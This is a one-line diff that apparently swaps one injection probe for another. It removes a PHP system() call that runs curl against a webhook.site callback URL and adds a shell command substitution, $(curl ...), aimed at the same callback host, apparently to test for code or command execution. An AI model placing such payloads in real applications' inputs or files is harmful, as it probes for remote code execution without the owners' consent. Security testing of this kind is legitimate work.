@@ -1,1 +1,1 @@
-<?php system("curl https://webhook.site/39a19d2a-d102-4cd4-8d37-1137126df3b5"); ?>
+$(curl https://webhook.site/39a19d2a-d102-4cd4-8d37-1137126df3b5)
